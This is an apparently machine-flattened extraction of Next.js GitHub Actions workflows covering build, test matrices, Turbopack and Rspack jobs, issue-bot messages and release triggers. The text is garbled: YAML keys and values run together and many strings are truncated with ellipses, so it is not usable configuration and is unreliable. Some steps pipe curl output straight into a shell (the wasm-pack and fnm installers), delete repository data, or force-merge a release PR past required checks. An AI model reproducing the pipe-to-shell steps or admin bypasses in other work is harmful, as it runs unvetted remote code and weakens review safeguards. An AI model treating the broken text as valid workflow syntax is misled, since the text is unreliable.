name: c ... release${{ steps.docs-change.outputs.DOCS_ONLY != 'false' }}${{ steps.is-release.outputs.IS_RELEASE == 'true' }}rspack${{
  github.event_name == 'pull_request' &&
  contains(github.event.pull_request.labels.*.name, 'Rspack')
}}docs-on ... lse' }}name: D ... changes./.github/workflows/build_reusable.yml./.gith ... ble.yml'changes'['changes']${{ needs.changes.outputs.docs-only == 'false' }}${{ nee ... lse' }}skipInstallBuild'yes'stepName'build-native'skipIns ... : 'yes'name: build-nativebuild-native-windows'build- ... indows'runs_on_labels["windows","self-hosted","x64"]'["wind ... "x64"]'buildNativeTargetname: b ... windowsbuild-nextskipNativeBuild'build-next'skipNat ... : 'yes'name: build-next['build-next']skipNativeInstallafterBuildpnpm lint-no-typescript
pnpm check-examples
pnpm validate-externals-doc
validate-docs-links'Run link checker'node ./.github/actions/validate-docs-links/dist/index.jsnode ./ ... ndex.jsname: ' ... hecker'check-types-precompiledcheck-t ... ompiledtypes and precompiledtypes a ... ompiled['chang ... -next']pnpm types-and-precompiledpnpm ty ... ompiledtypes-and-precompiled'types- ... mpiled'afterBu ... ompiledname: t ... ompiledtest-cargo-unittest cargo unitneedsRustneedsNextestpnpm dlx turbo@${TURBO_VERSION} run test-cargo-unitpnpm dl ... go-unitmold'test-cargo-unit'needsRust: 'yes'name: t ... go unittest-benchtest cargo benches'optimize-ci'['optim ... -next']${{ needs.optimize-ci.outputs.skip == 'false' && needs.changes.outputs.docs-only == 'false' }}./.github/workflows/test-turbopack-rust-bench-test.ymlname: t ... benchesrust-checkrust checkpnpm dlx turbo@${TURBO_VERSION} run rust-checkpnpm dl ... t-check'rust-check'name: rust checkrustdoc-checkrustdoc check./scripts/deploy-turbopack-docs.sh./scrip ... docs.sh'rustdoc-check'name: rustdoc checkast-grepast-grep lintast-grep lint stepast-grep/action@v1.5.0ast-gre ... @v1.5.00.31.0version: 0.31.0name: a ... nt stepneeds:  ... -next']devlow-benchRun devlow benchmarksRun dev ... chmarks['optim ... ative']${{ needs.optimize-ci.outputs.skip == 'false' && needs.changes.outputs.docs-only == 'false' && !github.event.pull_request.head.repo.fork }}${{ nee ... fork }}mode--turbopack=false'--turbopack=false'--turbopack=true'--turbopack=true'- '--tu ... =false'selector--scenario=heavy-npm-deps-dev --page=homepage'--scen ... mepage'--scenario=heavy-npm-deps-build --page=homepage--scenario=heavy-npm-deps-build-turbo-cache-enabled --page=homepage- '--sc ... mepage'mode:./node_modules/.bin/devlow-bench ./scripts/devlow-bench.mjs \
  --datadog=ubuntu-latest-16-core \
  ${{ matrix.mode }} \
  ${{ matrix.selector }}
devlow-bench-${{ matrix.mode }}-${{ matrix.selector }}'devlow ... tor }}'afterBuild: |test-devlowtest devlow package['optim ... anges']'test-devlow'pnpm run --filter=devlow-bench test
name: t ... packagetest-turbopack-devtest turbopack devreact${{ github.event_name == 'pull_request' && !contains(github.event.pull_request.labels.*.name, 'run-react-18-tests') && '18.3.1' }}${{ git ... 3.1' }}react:  ... 3.1' }}- react ... 3.1' }}[1/5, 2 ... 5, 5/5]18.3.1'18.3.1'['', '18.3.1']export NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/turbopack-dev-tests-manifest.json"
export IS_TURBOPACK_TEST=1
export TURBOPACK_DEV=1
export NEXT_TEST_MODE=dev
export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js \
  --test-pattern '^(test\/(development|e2e))/.*\.test\.(js|jsx|ts|tsx)$' \
  --timings \
  -g ${{ matrix.group }}
test-turbopack-dev-react-${{ matrix.react }}-${{ matrix.group }}'test-t ... oup }}'name: t ... ack devtest-turbopack-integrationtest-tu ... grationtest turbopack development integrationtest tu ... gration1/62/63/64/65/66/6[1/6, 2 ... 6, 6/6]['']group:  ... 6, 6/6]nodeVersion18.18.2export NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/turbopack-dev-tests-manifest.json"
export IS_TURBOPACK_TEST=1
export TURBOPACK_DEV=1
export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type integration
test-turbopack-integration-react-${{ matrix.react }}-${{ matrix.group }}nodeVersion: 18.18.2test-turbopack-productiontest-tu ... ductiontest turbopack productiontest tu ... duction1/72/73/74/75/76/77/7[1/7, 2 ... 7, 7/7]export NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/turbopack-build-tests-manifest.json"
export IS_TURBOPACK_TEST=1
export TURBOPACK_BUILD=1
export NEXT_TEST_MODE=start
export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js --timings -g ${{ matrix.group }} --type production
test-turbopack-production-react-${{ matrix.react }}-${{ matrix.group }}name: t ... ductiontest-turbopack-production-integrationtest turbopack production integrationgroup:  ... 7, 7/7]export NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/turbopack-build-tests-manifest.json"
export IS_TURBOPACK_TEST=1
export TURBOPACK_BUILD=1

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type integration
test-turbopack-production-integration-${{ matrix.group }}test-rspack-devtest rspack dev${{ needs.optimize-ci.outputs.skip == 'false' && needs.changes.outputs.docs-only == 'false' && needs.changes.outputs.rspack == 'true' }}group:  ... 5, 5/5]export NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/rspack-dev-tests-manifest.json"
export NEXT_TEST_MODE=dev

# rspack flags
export NEXT_RSPACK=1
export NEXT_TEST_USE_RSPACK=1

# HACK: Despite the name, this environment variable is only used to gate
# tests, so it's applicable to rspack
export TURBOPACK_DEV=1

node run-tests.js \
  --test-pattern '^(test\/(development|e2e))/.*\.test\.(js|jsx|ts|tsx)$' \
  --timings \
  -g ${{ matrix.group }}
test-rspack-dev-react-${{ matrix.react }}-${{ matrix.group }}'test-r ... oup }}'test-rspack-integrationtest-rs ... grationtest rspack development integrationtest rs ... grationexport NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/rspack-dev-tests-manifest.json"

# rspack flags
export NEXT_RSPACK=1
export NEXT_TEST_USE_RSPACK=1

# HACK: Despite the name, this environment variable is only used to gate
# tests, so it's applicable to rspack
export TURBOPACK_DEV=1

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type integration
test-rspack-integration-react-${{ matrix.react }}-${{ matrix.group }}test-rspack-productiontest-rs ... ductiontest rspack productiontest rs ... ductionexport NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/rspack-build-tests-manifest.json"
export NEXT_TEST_MODE=start

# rspack flags
export NEXT_RSPACK=1
export NEXT_TEST_USE_RSPACK=1

# HACK: Despite the name, this environment variable is only used to gate
# tests, so it's applicable to rspack
export TURBOPACK_BUILD=1

node run-tests.js --timings -g ${{ matrix.group }} --type production
test-rspack-production-react-${{ matrix.react }}-${{ matrix.group }}test-rspack-production-integrationtest rspack production integrationexport NEXT_EXTERNAL_TESTS_FILTERS="$(pwd)/test/rspack-build-tests-manifest.json"

# rspack flags
export NEXT_RSPACK=1
export NEXT_TEST_USE_RSPACK=1

# HACK: Despite the name, this environment variable is only used to gate
# tests, so it's applicable to rspack
export TURBOPACK_BUILD=1

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type integration
test-rspack-production-integration-${{ matrix.group }}test-next-swc-wasmtest next-swc wasmrustup target add wasm32-unknown-unknown
curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh
node ./scripts/normalize-version-bump.js
pnpm dlx turbo@${TURBO_VERSION} run build-wasm -- --target nodejs
git checkout .
mv crates/wasm/pkg crates/wasm/pkg-nodejs
node ./scripts/setup-wasm.mjs

export NEXT_TEST_MODE=start
export TEST_WASM=true
node run-tests.js \
  test/production/pages-dir/production/test/index.test.ts \
  test/e2e/streaming-ssr/index.test.ts
'test-next-swc-wasm'name: t ... wc wasmtest-next-swc-napi-wasitest-ne ... pi-wasitest next-swc wasirustup target add wasm32-wasip1-threads
pnpm dlx turbo@${TURBO_VERSION} run build-native-wasi
'test-n ... i-wasi'name: t ... wc wasitest-unittest unit['chang ... ative']node: [ ... ERSION]node run-tests.js --type unitnode ru ... pe unittest-unit-${{ matrix.node }}'test-u ... ode }}'nodeVer ... node }}name: test unittest-unit-windowstest unit windows['chang ... ndows']test-unit-windows-${{ matrix.node }}name: t ... windowstest-new-tests-devTest new tests for flakes (dev)Test ne ... s (dev)node scripts/test-new-tests.mjs \
  --flake-detection \
  --mode dev \
  --group ${{ matrix.group }}
test-new-tests-dev-${{matrix.group}}'test-n ... roup}}'name: T ... s (dev)test-new-tests-startTest new tests for flakes (prod)Test ne ...  (prod)node scripts/test-new-tests.mjs \
  --flake-detection \
  --mode start \
  --group ${{ matrix.group }}
test-new-tests-start-${{matrix.group}}name: T ...  (prod)test-new-tests-deploytest-ne ... -deployTest new tests when deployedTest ne ... eployedtest-prod'test-prod''test-new-tests-dev''test-n ... -start'['optim ... start']${{ needs.optimize-ci.outputs.skip == 'false' }}export NEXT_E2E_TEST_TIMEOUT=240000
export GH_PR_NUMBER=${{ github.event.pull_request && github.event.pull_request.number || '' }}
node scripts/test-new-tests.mjs \
  --mode deploy \
  --group ${{ matrix.group }}
test-new-tests-deploy-${{matrix.group}}name: T ... eployedtest-devtest devexport NEXT_TEST_MODE=dev
export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type development
test-dev-react-${{ matrix.react }}-${{ matrix.group }}'test-d ... oup }}'name: test devtest-dev-windowstest dev windowsexport NEXT_TEST_MODE=dev

node run-tests.js \
  test/e2e/app-dir/app/index.test.ts \
  test/e2e/app-dir/app-edge/app-edge.test.ts
'test-dev-windows'test-integration-windowstest-in ... windowstest integration windowstest in ... windowsnode run-tests.js \
  --concurrency 4 \
  test/production/pages-dir/production/test/index.test.ts \
  test/integration/css-client-nav/test/index.test.js \
  test/integration/rewrites-has-condition/test/index.test.js \
  test/integration/create-next-app/index.test.ts \
  test/integration/create-next-app/package-manager/pnpm.test.ts
'test-i ... indows'test-prod-windowstest prod windowsexport NEXT_TEST_MODE=start

node run-tests.js \
  test/e2e/app-dir/app/index.test.ts \
  test/e2e/app-dir/app-edge/app-edge.test.ts \
  test/e2e/app-dir/metadata-edge/index.test.ts
'test-prod-windows'test prodexport NEXT_TEST_MODE=start
export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js --timings -g ${{ matrix.group }} --type production
test-prod-react-${{ matrix.react }}-${{ matrix.group }}'test-p ... oup }}'name: test prodtest-integration1/132/133/134/135/136/137/138/139/1310/1311/1312/1313/13- 1/13group:export NEXT_TEST_REACT_VERSION="${{ matrix.react }}"

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type integration
test-integration-${{ matrix.group }}-react-${{ matrix.react }}'test-i ... act }}'test-firefox-safaritest firefox and safaritest fi ...  safaripnpm playwright install

# these all run without concurrency because they're heavier
export TEST_CONCURRENCY=1

BROWSER_NAME=firefox node run-tests.js \
  test/production/pages-dir/production/test/index.test.ts

NEXT_TEST_MODE=start BROWSER_NAME=safari node run-tests.js \
  test/production/pages-dir/production/test/index.test.ts \
  test/e2e/basepath/basepath.test.ts \
  test/e2e/basepath/error-pages.test.ts

BROWSER_NAME=safari DEVICE_NAME='iPhone XR' node run-tests.js \
  test/production/prerender-prefetch/index.test.ts
'test-f ... safari'name: t ...  safaritest-ppr-integrationtest ppr integrationexport __NEXT_EXPERIMENTAL_PPR=true
export NEXT_EXTERNAL_TESTS_FILTERS="test/ppr-tests-manifest.json"

node run-tests.js \
  --timings \
  --type integration
'test-p ... ration'test-ppr-devtest ppr devexport __NEXT_EXPERIMENTAL_PPR=true
export NEXT_EXTERNAL_TESTS_FILTERS="test/ppr-tests-manifest.json"
export NEXT_TEST_MODE=dev

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type development
test-ppr-dev-${{ matrix.group }}name: test ppr devtest-ppr-prodtest ppr prodexport __NEXT_EXPERIMENTAL_PPR=true
export NEXT_EXTERNAL_TESTS_FILTERS="test/ppr-tests-manifest.json"
export NEXT_TEST_MODE=start

node run-tests.js \
  --timings \
  -g ${{ matrix.group }} \
  --type production
test-ppr-prod-${{ matrix.group }}name: test ppr prodtests-pass'valida ... -links''check- ... mpiled''test-unit''test-dev''test-integration''test-ppr-dev''test-ppr-prod''test-turbopack-dev''test-t ... ration''test-n ... deploy''test-t ... uction''test-unit-windows'thank you, next${{ always() && (contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')) }}${{ alw ... d')) }}run: exit 1- run: exit 1optimize-ci:name: build-and-test/home/huawei/github-actions-security/.github/workflows/vercel_next.js__build_reusable.ymlBuild Reusableadditional steps to run'additi ... to run'whether to use the mold linker'whethe ... linker'whether to skip pnpm install && pnpm build'whethe ...  build'whether to skip building native modules'whethe ... odules'whether to skip native postinstall script'whethe ... script'uploadAnalyzerArtifactsuploadA ... tifactswhether to upload analyzer artifacts'whethe ... ifacts'version of Node.js to use'versio ... to use'if rust is needed'if rust is needed'if nextest rust dep is needed'if nex ... needed'uploadSwcArtifactif swc artifact needs uploading'if swc ... oading'rustCacheKeyrustCacheKey to cache shared target assets'rustCa ... assets'name of the step, to be used for the upload artifact unique key 'name o ... e key 'Timeout in minutes'Timeout in minutes'descrip ... inutes'List of runner labels'List o ... labels'["self-hosted", "linux", "x64", "metal"]'["self ... etal"]'descrip ... labels'Target for build-native step'Target ... e step'descrip ... e step'afterBuild:2.14.720.9.0TEST_CONCURRENCYTURBO_API${{ secrets.HOSTED_TURBO_API }}${{ sec ... _API }}TURBO_TOKEN${{ secrets.HOSTED_TURBO_TOKEN }}${{ inputs.skipNativeInstall == 'yes' && '1' || '' }}${{ inp ... | '' }}NEXT_JUNIT_TEST_REPORTNEXT_JU ... _REPORT'ci'TEST_TIMINGS_TOKEN${{ secrets.TEST_TIMINGS_TOKEN }}NEXT_TEST_JOBVERCEL_TEST_TOKEN${{ secrets.VERCEL_TEST_TOKEN }}VERCEL_TEST_TEAMvtest314-next-e2e-testsvtest31 ... e-testsNEXT_TEST_PREFER_OFFLINENEXT_TE ... OFFLINENEXT_CI_RUNNER${{ inputs.runs_on_labels }}${{ inp ... bels }}NAPI_CL ...  2.14.7${{ inputs.timeout_minutes }}${{ fromJson(inputs.runs_on_labels) }}${{ fro ... els) }}input_step_key${{ steps.var.outputs.input_step_key }}${{ ste ... _key }}input_s ... _key }}Check if fnm is installedCheck i ... stalledcheck-fnmif [ -x "$(command -v fnm)" ]; then
  echo "fnm found."
  echo "found=true" >> $GITHUB_OUTPUT
else
  echo "fnm not found."
  echo "found=false" >> $GITHUB_OUTPUT
fi
Install fnmsteps.check-fnm.outputs.found != 'true'curl -fsSL https://fnm.vercel.app/install | bash
export PATH="/home/runner/.local/share/fnm:$PATH"
echo "/home/runner/.local/share/fnm" >> $GITHUB_PATH
fnm env --json | jq -r 'to_entries|map("\(.key)=\(.value|tostring)")|.[]' | xargs -I {} echo "{}" >> $GITHUB_ENV
name: Install fnmNormalize input step names into path keyNormali ... ath keyvarcore.setOutput('input_step_key', '${{ inputs.stepName }}'.toLowerCase().replaceAll(/[/.]/g, '-').trim('-'));
name: N ... ath keyfnm use --install-if-missing ${{ inputs.nodeVersion || env.NODE_LTS_VERSION }}fnm use ... SION }}run: fn ... SION }}fnm default ${{ inputs.nodeVersion || env.NODE_LTS_VERSION }}fnm def ... SION }}node -vrun: node -vPrepare corepack${{ contains(fromJson(inputs.runs_on_labels), 'ubuntu-latest') }}${{ con ... st') }}npm i -g corepack@0.31
name: P ... orepackrun: pwdrun: rm -rf .git${{ inputs.skipNativeBuild != 'yes' || inputs.needsNextest == 'yes' || inputs.needsRust == 'yes' }}${{ inp ... yes' }}Install mold linker'Instal ... linker'${{ inputs.mold == 'yes' }}sudo apt update
sudo apt install -y mold
echo RUSTFLAGS=${RUSTFLAGS}\ -C\ link-arg=-fuse-ld=mold >> $GITHUB_ENV
name: ' ... linker'Install nextest${{ inputs.needsNextest == 'yes' }}taiki-e/install-action@nextesttaiki-e ... nextestname: I ... nextestrustc --versionrun: rustc --versioncorepack prepare --activate yarn@1.22.19 && npm i -g "@napi-rs/cli@${NAPI_CLI_VERSION}"corepac ... RSION}"run: co ... RSION}"${{ inputs.rustCacheKey }}${{ inp ... eKey }}${{ github.ref_name == 'canary' }}${{ git ... ary' }}${{ inputs.rustCacheKey }}-${{ inputs.buildNativeTarget }}-build-${{ hashFiles('.cargo/config.toml') }}${{ inp ... ml') }}cache-p ... 'turbo'git clean -xdf && rm -rf /tmp/next-repo-*; rm -rf /tmp/next-install-* /tmp/yarn-* /tmp/ncc-cache targetgit cle ...  targetrun: gi ...  targetSet CI git usergit config --global user.name "vercel-ci-bot"
git config --global user.email "infra+ci@vercel.com"
cargo cleanrun: cargo cleanrun: no ... bump.jspnpm dlx turbo@${TURBO_VERSION} run build-native-release -v --env-mode loose --remote-cache-timeout 90 --summarize -- --target ${{ inputs.buildNativeTarget }}${{ inputs.skipNativeBuild != 'yes' }}run: pn ... rget }}Upload next-swc artifact${{ inputs.uploadSwcArtifact == 'yes' }}next-swc-binarypackages/next-swc/native/next-swc.linux-x64-gnu.nodepackage ... nu.nodename: n ... -binarygit checkout .${{ inputs.skipInstallBuild != 'yes' }}run: git checkout .Install node-file-trace test dependenciesturbopack/crates/turbopack/tests/node-file-traceturbopa ... e-tracepnpm install -r --side-effects-cache falsepnpm in ... e falseANALYZE=1 pnpm buildrun: AN ... m buildRe-run pnpm install to link built packages into node_modules/.binRe-run  ... es/.binname: R ... es/.binpnpm playwright install-depspnpm pl ... ll-depsrun: pn ... ll-depspnpm playwright install chromiumpnpm pl ... hromiumrun: pn ... hromiumpnpm dlx turbo@${TURBO_VERSION} run get-test-timings -- --build ${{ github.sha }}pnpm dl ... .sha }}run: pn ... .sha }}${{ inputs.afterBuild }}bash -le {0}run: ${ ... uild }}turbo-run-summary-${{ steps.var.outputs.input_step_key }}turbo-r ... _key }}name: t ... _key }}Upload bundle analyzer artifacts${{ inputs.uploadAnalyzerArtifacts == 'yes' }}webpack bundle analysis stats-${{ steps.var.outputs.input_step_key }}webpack ... _key }}packages/next/dist/compiled/next-server/report.*.htmlpackage ... .*.htmlname: w ... _key }}Upload test report to datadogUpload  ... datadog${{ inputs.afterBuild && always() && !github.event.pull_request.head.repo.fork }}${{ inp ... fork }}# Add a `test.type` tag to distinguish between turbopack and next.js runs
# Add a `nextjs.test_session.name` tag to help identify the job
if [ -d ./test/test-junit-report ]; then
  pnpm dlx @datadog/datadog-ci@2.45.1 junit upload \
    --service nextjs \
    --tags test.type:nextjs \
    --tags test_session.name:"${{ inputs.stepName }}" \
    ./test/test-junit-report
fi
if [ -d ./test/turbopack-test-junit-report ]; then
  pnpm dlx @datadog/datadog-ci@2.45.1 junit upload \
    --service nextjs \
    --tags test.type:turbopack \
    --tags test_session.name:"${{ inputs.stepName }}" \
    ./test/turbopack-test-junit-report
fi
name: U ... datadogUpload Playwright SnapshotsUpload  ... apshots${{ inputs.afterBuild && always() }}${{ inp ... ys() }}test-playwright-snapshots-${{ steps.var.outputs.input_step_key }}test-pl ... _key }}test/traces
name: U ... apshotstimeout ... utes }}name: Build Reusable/home/huawei/github-actions-security/.github/workflows/vercel_next.js__cancel.ymlCancelcancelCancel Previous Runs'Cancel ... s Runs'styfle/cancel-workflow-action@0.12.1styfle/ ... @0.12.1444921, 444987, 57419851444921, ... 7419851workflo ... 7419851uses: s ... @0.12.1- uses: ... @0.12.1name: ' ... s Runs'cancel:name: Cancel/home/huawei/github-actions-security/.github/workflows/vercel_next.js__code_freeze.ymlEnable/disable code freezeEnable/ ...  freezeenabledisable- enabledescrip ...  freezetype:CODE_FREEZE_TOKENCODE_FREEZE_TOKEN:Code Freezerelease-${{ github.event.inputs.releaseType }}release ... Type }}git clone https://github.com/vercel/next.js.git --depth=1 .git clo ... pth=1 .run: gi ... pth=1 .node ./scripts/code-freeze.js --type ${{ github.event.inputs.type }}node ./ ... type }}${{ secrets.CODE_FREEZE_TOKEN }}CODE_FR ... OKEN }}run: no ... type }}start:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__force_merge_canary_release_pr.ymlForce Merge Canary Release PRForce M ... ease PRforce-merge-canary-release-prforce-m ... ease-prgithub.event.pull_request.user.login == 'vercel-release-bot' &&
github.event.pull_request.title == 'Version Packages (canary)' &&
contains(github.event.pull_request.labels.*.name, 'created-by: CI')
Bypass required status checks and merge PRBypass  ... erge PRgh pr merge --admin --squash "$PR_URL"gh pr m ... PR_URL"name: B ... erge PR- name: ... erge PRforce-m ... ase-pr:name: F ... ease PR/home/huawei/github-actions-security/.github/workflows/vercel_next.js__graphite_ci_optimizer.ymlGraphite CI OptimizerGraphit ... timizer'true' if expensive CI checks should be skipped, 'false' otherwise."'true' ... rwise."${{ jobs.optimize-ci.outputs.skip }}${{ job ... skip }}descrip ... rwise."skip:GRAPHITE_TOKENThe Graphite CI optimization secret'The Gr ... secret'descrip ... secret'GRAPHITE_TOKEN:HAS_BYPASS_LABEL${{
  github.event_name == 'pull_request' &&
  contains(github.event.pull_request.labels.*.name, 'CI Bypass Graphite Optimization')
}}HAS_BYPASS_LABEL: |-${{ env.HAS_BYPASS_LABEL == 'false' && steps.check-skip.outputs.skip == 'true' }}skip: $ ... rue' }}Optimize CIcheck-skipwithgraphite/graphite-ci-action@mainwithgra ... on@maingraphite_token${{ secrets.GRAPHITE_TOKEN }}graphit ... OKEN }}name: Optimize CIDebug Outputecho 'github.event_name: ${{ github.event_name }}'
echo "secrets.GRAPHITE_TOKEN != '': ${{ secrets.GRAPHITE_TOKEN != '' }}"
echo 'env.HAS_BYPASS_LABEL: ${{ env.HAS_BYPASS_LABEL }}'
echo 'steps.check-skip.outputs.skip: ${{ steps.check-skip.outputs.skip }}'
name: Debug Output- name: Optimize CIname: G ... timizer/home/huawei/github-actions-security/.github/workflows/vercel_next.js__integration_tests_reusable.ymlIntegration Tests ReusableIntegra ... eusableA unique identifer used for uploaded assetsA uniqu ...  assetsdescrip ...  assets"development" or "production"'"devel ... ction"'descrip ... ction"'run_before_testBash code to run before executing the test (e.g. setting environment variables). Runs in the same step as the test.
description: >e2e_groupsSize of the matrix used for running e2e tests (controls parallelism)
integration_groupsSize of the matrix used for running legacy integration tests (controls parallelism)
e2e_timeout_minutestype: numberintegration_timeout_minutesintegra ... minutesnum_retriesskipNativeBuild: yesskipIns ... ld: yesgenerate-matrices[self-h ...  metal]outprintf 'e2e=[%s]\n' \
  "$(seq -s, 1 ${{ inputs.e2e_groups }})" | \
  tee -a "$GITHUB_OUTPUT"
printf 'integration=[%s]\n' \
  "$(seq -s, 1 ${{ inputs.integration_groups }})" | \
  tee -a "$GITHUB_OUTPUT"
id: out- id: oute2e${{ steps.out.outputs.e2e }}${{ ste ... .e2e }}${{ steps.out.outputs.integration }}${{ ste ... tion }}e2e: ${ ... .e2e }}runs-on ...  metal]test-e2eNext.js integration test (E2E and ${{ inputs.test_type }}) (${{ matrix.group }}/${{ inputs.e2e_groups }})[build- ... trices]${{ fromJSON(needs.generate-matrices.outputs.e2e) }}${{ fro ... e2e) }}group:  ... e2e) }}# e2e and ${{ inputs.test_type }} tests with `node run-tests.js`

export NEXT_TEST_CONTINUE_ON_ERROR=TRUE
export NEXT_TEST_MODE=${{
  inputs.test_type == 'development' && 'dev' || 'start'
}}

${{ inputs.run_before_test }}

node run-tests.js \
  --group ${{ matrix.group }}/${{ inputs.e2e_groups }} \
  --retries ${{ inputs.num_retries }} \
  --type ${{ inputs.test_type }}
test-${{ inputs.name }}-${{ matrix.group }}test-${ ... roup }}${{ inputs.e2e_timeout_minutes }}name: >-Next.js integration test (Integration) (${{ matrix.group }}/${{ inputs.e2e_groups }})${{ fromJSON(needs.generate-matrices.outputs.integration) }}group:  ... ion) }}# legacy integration tests with `node run-tests.js`

export NEXT_TEST_CONTINUE_ON_ERROR=TRUE

# HACK: Despite the name, these environment variables are just used to
# gate tests, so they're applicable to both turbopack and rspack tests
export ${{
  inputs.test_type == 'development' &&
    'TURBOPACK_DEV=1' ||
    'TURBOPACK_BUILD=1'
}}

${{ inputs.run_before_test }}

node run-tests.js \
  --group ${{ matrix.group }}/${{ inputs.integration_groups }} \
  --retries ${{ inputs.num_retries }} \
  --type integration
test-${{ inputs.name }}-integration-${{ matrix.group }}${{ inputs.integration_timeout_minutes }}collect_nextjs_development_integration_statcollect ... on_stat[test-e ... ration]Next.js integration test development status reportNext.js ...  reportCollect integration test statCollect ... st stat./.github/actions/next-integration-stat./.gith ... on-statname: C ... st statStore artifactstest-results-${{ inputs.name }}test-re ... name }}nextjs-test-results.json
failed-test-path-list.json
passed-test-path-list.json
name: t ... name }}needs:  ... ration]build-next:name: I ... eusable/home/huawei/github-actions-security/.github/workflows/vercel_next.js__issue_bankrupt.ymlBankrupt issues'Bankrupt issues'created date range'created date range'descrip ...  range'created:bankruptgithub.repository_owner == 'vercel'github. ... vercel'Bankrupt issues & send notification to Slack'Bankru ...  Slack'node ./.github/actions/next-repo-actions/dist/bankrupt/index.js${{ secrets.SLACK_TOKEN }}CREATED${{ github.event.inputs.created }}${{ git ... ated }}name: ' ...  Slack'if: git ... vercel'bankrupt:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__issue_lock.yml0 0,12 * * *'0 0,12 * * *'cron: '0 0,12 * * *'group: lockactiondessant/lock-threads@v5dessant ... eads@v5locked'locked'add-pr-labelsThis closed issue has been automatically locked because it had no new activity for 2 weeks. If you are running into a similar issue, please create a new issue with the steps to reproduce. Thank you.'This c ... k you.'log-outputuses: d ... eads@v5- uses: ... eads@v5action:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__issue_stale.ymlStale issue handler'Stale  ... andler'40 23 * * *'40 23 * * *'cron: '40 23 * * *'issue-staleMark stale issues, close stale issues'Mark s ... issues'${{ secrets.STALE_TOKEN }}545remove-issue-stale-when-updatedlabels-to-add-when-unstalenot stale'not stale'This issue has been automatically marked as stale due to two years of inactivity. It will be closed in 7 days unless thereâ€™s further input. If you believe this issue is still relevant, please leave a comment or provide updated details. Thank you.'This i ... k you.'This issue has been automatically closed due to two years of inactivity. If youâ€™re still experiencing a similar problem or have additional details to share, please open a new issue following our current issue template. Your updated report helps us investigate and address concerns more efficiently. Thank you for your understanding!'This i ... nding!'stale-no-reproClose stale issues with no reproduction'Close  ... uction'any-of-issue-labelsplease add a complete reproduction'please ... uction'This issue has been automatically closed due to 2 days of inactivity and the absence of a complete reproduction. If you believe this was done in error, please leave a comment. If you are experiencing a similar issue, consider opening a new issue with a complete reproduction. Thank you.stale-simple-reproClose issues with no simple repro'Close  ...  repro'please simplify reproductionThis issue has been automatically closed due to 14 days of inactivity and the absence of a simple reproduction for investigation. If you believe this was done in error, please leave a comment. If you are experiencing a similar issue, consider opening a new issue with a simple reproduction. Thank you.stale-no-canaryClose issues not verified on canary'Close  ... canary'please verify canary'please ... canary'This issue has been automatically closed due to 14 days of inactivity and the absence of testing against next@canary. If you believe this was done in error, please leave a comment. If you are experiencing a similar issue, consider opening a new issue with a reproduction. Thank you.name: ' ... andler'/home/huawei/github-actions-security/.github/workflows/vercel_next.js__issue_version.ymlFetch Issues by Version'Fetch  ... ersion'Next.js Version'Next.js Version'fetch_issuesFetch issues & send notification to Slack'Fetch  ...  Slack'node ./.github/actions/next-repo-actions/dist/issues-by-version/index.jsfetch_issues:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__issue_wrong_template.ymlClose issues using the wrong issue template'Close  ... mplate'closegithub.event.label.name == 'please use the correct issue template'github. ... mplate'node ./.github/actions/next-repo-actions/dist/wrong-issue-template/index.jsname: ' ... mplate'if: git ... mplate'close:/home/huawei/github-actions-security/.github/workflows/vercel_next.js__notify_release.ymlNotify new Next.js releaseNotify  ... releasenotify-new-releaseretry-exempt-status-codesretry-e ... s-codes400,401${{ secrets.TURBOPACK_TEST_TOKEN }}github.request('POST /repos/{owner}/{repo}/dispatches', {
  owner: 'vercel',
  repo: 'turbo',
  event_type: 'nextjs-release-published',
  client_payload: {
    version: context.ref
  }
})
front-syncnextPackageInfoGet `next` package infoGet `ne ... ge infocd packages/next 
{
  echo 'value<<EOF'
  cat package.json
  echo EOF
} >> "$GITHUB_OUTPUT"
id: nextPackageInfoExtract `next` versionExtract ... versionecho 'value=${{ fromJson(steps.nextPackageInfo.outputs.value).version }}' >> "$GITHUB_OUTPUT"echo 'v ... OUTPUT"id: versionCheck tokengh auth status${{ secrets.FRONT_TEST_TOKEN }}name: Check tokenTrigger vercel/front syncTrigger ... nt synctrigger-front-sync400,401,404await github.request(
  "POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches",
  {
    owner: "vercel",
    repo: "front",
    workflow_id: "cron-update-next.yml",
    ref: "main",
    inputs: {
      version: "${{ steps.version.outputs.value }}",
    },
  }
);
// Ideally we'd include a URL to this specific sync.
// However, creating a workflow_dispatch event does not produce an ID: https://github.com/orgs/community/discussions/9752
console.info(
  "Sync started in https://github.com/vercel/front/actions/workflows/cron-update-next.yml?query=event%3Aworkflow_dispatch"
);
console.info(
  "This may not start a new sync if one is already in progress. Check the logs of the cron-update-next Workflow run."
);
